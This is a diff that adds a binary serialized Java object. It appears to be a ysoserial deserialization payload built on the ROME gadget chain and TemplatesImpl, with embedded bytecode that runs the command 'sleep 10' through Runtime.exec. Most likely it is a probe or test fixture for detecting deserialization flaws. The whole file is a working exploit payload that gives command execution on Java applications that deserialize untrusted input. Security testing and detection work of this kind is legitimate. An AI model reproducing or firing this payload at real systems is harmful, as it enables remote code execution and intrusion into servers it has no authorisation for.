@@ -1,0 +1,41 @@
+??srjava.util.HashMap???`?F
+loadFactorI	thresholdxp?@sr(com.sun.syndication.feed.impl.ObjectBean???v?JL_cloneableBeant-Lcom/sun/syndication/feed/impl/CloneableBean;L
+                                                             _equalsBeant*Lcom/s_toStringBeant,Lcom/sun/syndication/feed/impl/ToStringBean;xpsr+com.sun.syndication.feed.impl.CloneableBean?a??3OkwL_ignorePropertiestLjava/util/Set;L_objtLjava/lang/Object;xpsrjava.util.Collections$EmptySet?r??(xpsq~sq~q~
+                                                              sr:com.sun.org.apa_indentNumberI_transletIndex[.TemplatesImpl	WO?n??3I
+_bytecodest[[B[_classt[Ljava/lang/Class;L_nametLjava/lang/String;L_outputPropertiestLjava/util/Properties;xp????ur[[BK?gg?7xpur[B??T?xp?????29
+ConstantValue? ????><init>()VCodeLineNumberTableLocalVariableTablethisStubTransletPayload
+         InnerClasses5Lysoserial/payloads/util/Gadgets$StubTransletPayload;	transformr(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)document-Lcom/sun/org/apache/xalan/internal/xsltc/DOMhandlersB[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+Exceptions'?(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)iterator5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;handlerALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+SourceFile
+          Gadgets.java
+
+
+(3ysoserial/payloads/util/Gadgets$StubTransletPayload@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTransletjava/io/Serializable9com/sun/org/apache/xalan/internal/xsltc/TransletExceptionysoserial/payloads/util/Gadget<clinit>java/lang/Runtime*
+getRuntime()Ljava/lang/Runtime;
+                               ,-
++sleep 10exec'(Ljava/lang/String;)Ljava/lang/Process;
+                                                     23
+StackMapTableysoserial/Pwner663258960406133 Lysoserial/Pwner663258960406133;!
+
+
+/*??
+ 8
+4 8?
+8*)?
+
+   $?L?/1?5W?6 !
+#	uq~?????2
+ConstantValueq?i?<mG<init>()VCodeLineNumberTableLocalVariableTablethisFoo
+                                                                         InnerClasses%Lysoserial/payloads/util/Gadgets$Foo;
+SourceFile
+          Gadgets.java
+
+
+#ysoserial/payloads/util/Gadgets$Foojava/lang/Objectjava/io/Serializableysoserial/payloads/util/Gadgets!
+
+
+<*??
+
+	ptPwnrpwxsr(com.sun.syndication.feed.impl.EqualsBean?????L
+_beanClasstLjava/lang/Class;L_objq~	xpvrjavax.xml.transform.Templatesxpq~sr*com.sun.syndication.feed.impl.ToStringBean	??J#?1L
+q~q~q~x% 
